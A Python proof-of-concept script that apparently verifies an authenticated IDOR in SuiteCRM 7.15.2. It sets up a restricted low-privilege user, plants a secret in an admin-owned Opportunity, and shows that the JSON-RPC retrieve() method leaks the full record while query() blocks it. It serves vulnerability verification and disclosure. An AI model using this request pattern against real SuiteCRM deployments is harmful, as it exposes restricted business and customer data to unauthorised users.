#!/usr/bin/env python3
"""
VULN-001 -- JSON-RPC `retrieve`: authenticated IDOR, read any record of any module.

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/JsonRPCServer/JsonRPCServerCalls.php:69-70 -- retrieve() calls
             $focus->retrieve($record) and serializes every column with NO
             ACLAccess()/Security-Group check at all. Contrast its sibling query()
             (:148), which correctly gates with `$focus->ACLAccess('ListView', true)`.

Plan
----
1. As admin, create a low-privilege test user (_common.create_user).
2. Seed a restrictive ACL Role (Opportunities: view=NONE, list=NONE) and assign it to
   that ONE test user via direct DB rows (_c1_common.restrict_role) -- this models a
   real production Security-Groups/Role configuration; SuiteCRM ships with
   acl_actions.aclaccess=ALL(90) for every module by default (verified empirically:
   `SELECT * FROM acl_actions WHERE category='Opportunities'` -> all rows aclaccess=90),
   so the bypass is only *visible* once an org actually restricts something -- which is
   exactly the "defeats Security-Groups multi-team isolation" claim in the static finding.
3. As admin, create an Opportunity carrying a random secret marker in `description`,
   owned by admin (nothing to do with the low-priv user or their team).
4. Log the low-priv user in fresh (so their $_SESSION['ACL'] cache is computed AFTER
   the role exists) and, over the SAME authenticated web session, call the JSON-RPC
   endpoint (index.php?entryPoint=json_server) twice:
     a) method=query   (the ACL'd sibling)    -> expect ZERO rows for the victim record
     b) method=retrieve (the vulnerable sink) -> expect the FULL record, including the
        admin-only secret marker in `description`
   Both calls use the identical low-priv session, so the contrast isolates exactly the
   one missing check.
5. Cross-check the leaked value against the live `opportunities` DB row directly, so the
   proof is "the real secret was returned", not merely "some text came back".
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                      admin_session, web_login, create_user, rest_login, rest_call)
from _c1_common import db_rows, restrict_role

import json
import requests

VULN_ID = "VULN-001"
HERE = os.path.dirname(os.path.abspath(__file__))
JSON_SERVER_URL = f"{BASE_URL}/index.php?entryPoint=json_server"


def json_rpc(session, method, params, req_id="1"):
    body = {"method": method, "id": req_id, "params": params}
    r = session.post(JSON_SERVER_URL, data=json.dumps(body),
                      headers={"Content-Type": "application/json",
                               "Referer": f"{BASE_URL}/index.php?module=Home&action=index"},
                      timeout=30)
    return r


def main():
    banner(VULN_ID, "JSON-RPC retrieve() IDOR -- read any record with no ACL")

    log("SETUP", "admin web session")
    admin_s = admin_session()

    log("SETUP", "create fresh low-privilege user")
    low = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"low-priv user: {low['user_name']} id={low['id']}")

    log("SETUP", "restrict Opportunities view+list = NONE for a fresh Role, assign ONLY to this user "
                 "(models a real Security-Groups/Role-restricted deployment)")
    role_id = restrict_role(low["id"], [("Opportunities", "view"), ("Opportunities", "list")])
    log("OK", f"role {role_id} created and assigned (DB rows in acl_roles/acl_roles_actions/acl_roles_users)")

    log("SETUP", "admin creates a victim Opportunity via legacy REST set_entry (admin-owned, secret marker)")
    admin_sid = rest_login(ADMIN_USER, ADMIN_PASS)
    secret = f"CVEHUNTER-SECRET-{rand('opp')}"
    opp_name = f"Stage10 VULN-001 target {rand('n')}"
    res = rest_call("set_entry", [admin_sid, "Opportunities", [
        {"name": "name", "value": opp_name},
        {"name": "description", "value": secret},
        {"name": "sales_stage", "value": "Prospecting"},
        {"name": "amount", "value": "1337"},
        {"name": "date_closed", "value": "12/31/2026"},
    ]])
    opp_id = res.get("id")
    if not opp_id or opp_id == "-1":
        verdict(VULN_ID, "FAILED", f"could not create victim Opportunity via set_entry: {res}")
        sys.exit(1)
    log("OK", f"victim Opportunity id={opp_id} name={opp_name!r} description={secret!r} (owned by admin)")

    # Confirm what actually landed in the DB, independent of the API's own echo.
    rows = db_rows(f"SELECT id, name, description FROM opportunities WHERE id='{opp_id}';")
    if not rows or rows[0].get("description") != secret:
        verdict(VULN_ID, "FAILED", f"DB row for {opp_id} does not carry the expected secret: {rows}")
        sys.exit(1)
    log("INFO", f"DB-verified opportunities row: {rows[0]}")

    log("SETUP", "low-priv user logs in fresh (web session) -- ACL cache computed AFTER the role exists")
    low_s = web_login(low["user_name"], low["password"])

    # --- Control: the ACL'd sibling method must show ZERO access -----------------------
    log("STEP", "JSON-RPC method=query (ACL'd sibling) for the victim record, as low-priv")
    r_query = json_rpc(low_s, "query", [{
        "module": "Opportunities",
        "conditions": [{"name": "id", "op": "contains", "value": opp_id}],
        "field_list": ["id", "name", "description"],
    }], req_id="1")
    query_json = r_query.json()
    query_list = (query_json.get("result") or {}).get("list") if isinstance(query_json.get("result"), dict) else query_json.get("result")
    # query()'s own result shape nests differently across versions; just check the raw text for the secret.
    query_leaked = secret in r_query.text
    log("INFO", f"query() HTTP {r_query.status_code}, body={r_query.text[:300]!r}")
    log("PROOF" if not query_leaked else "FAIL", f"ACL'd query(): secret present in response = {query_leaked} "
                                                  "(expected False -- ACLAccess('ListView') should block it)")

    # --- The actual bug: retrieve() has no ACL check at all -----------------------------
    log("STEP", "JSON-RPC method=retrieve (VULNERABLE sink) for the SAME victim record, SAME low-priv session")
    r_retrieve = json_rpc(low_s, "retrieve", [{"module": "Opportunities", "record": opp_id}], req_id="2")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"POST /index.php?entryPoint=json_server HTTP/1.1\n"
                f"Host: {BASE_URL.split('//', 1)[1]}\n"
                f"Content-Type: application/json\n"
                f"Cookie: {'; '.join(f'{k}={v}' for k, v in low_s.cookies.get_dict().items())}\n\n"
                + json.dumps({"method": "retrieve", "id": "2",
                               "params": [{"module": "Opportunities", "record": opp_id}]}))
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r_retrieve.status_code} {r_retrieve.reason}\n"
                + "\n".join(f"{k}: {v}" for k, v in r_retrieve.headers.items())
                + f"\n\n{r_retrieve.text}\n")
    with open(os.path.join(HERE, "evidence", "query_control_response.json"), "w") as f:
        f.write(r_query.text)
    with open(os.path.join(HERE, "evidence", "retrieve_vulnerable_response.json"), "w") as f:
        f.write(r_retrieve.text)

    retrieve_json = r_retrieve.json()
    fields = ((retrieve_json.get("result") or {}).get("record") or {}).get("fields", {})
    leaked_description = fields.get("description")
    log("INFO", f"retrieve() HTTP {r_retrieve.status_code}, module={fields.get('name', '<n/a>')!r}, "
                f"returned description={leaked_description!r}")

    retrieve_leaked = leaked_description == secret

    log("PROOF", f"low-priv user (Opportunities view=NONE, list=NONE via Role {role_id}) -- "
                 f"query()={'BLOCKED (0 rows / no secret)' if not query_leaked else 'also leaked (unexpected)'}; "
                 f"retrieve()={'LEAKED FULL RECORD' if retrieve_leaked else 'did not leak'}")

    ok = (not query_leaked) and retrieve_leaked
    if not ok:
        reason = []
        if query_leaked:
            reason.append("query() unexpectedly also returned the secret (ACL restriction setup may not have taken)")
        if not retrieve_leaked:
            reason.append(f"retrieve() did not return the secret description (got {leaked_description!r})")
        verdict(VULN_ID, "FAILED", "; ".join(reason))
        sys.exit(1)

    log("OK", "Confirmed: retrieve() bypasses the exact ACL restriction that query() (same endpoint family, "
              "same low-priv session) correctly enforces.")
    verdict(VULN_ID, "CONFIRMED",
            f"low-priv user w/ Opportunities view=list=NONE read admin-owned Opportunity {opp_id} via "
            f"JSON-RPC retrieve(); leaked description == planted secret {secret!r}; query() on the same "
            f"record via the same session returned nothing")
    sys.exit(0)


if __name__ == "__main__":
    main()
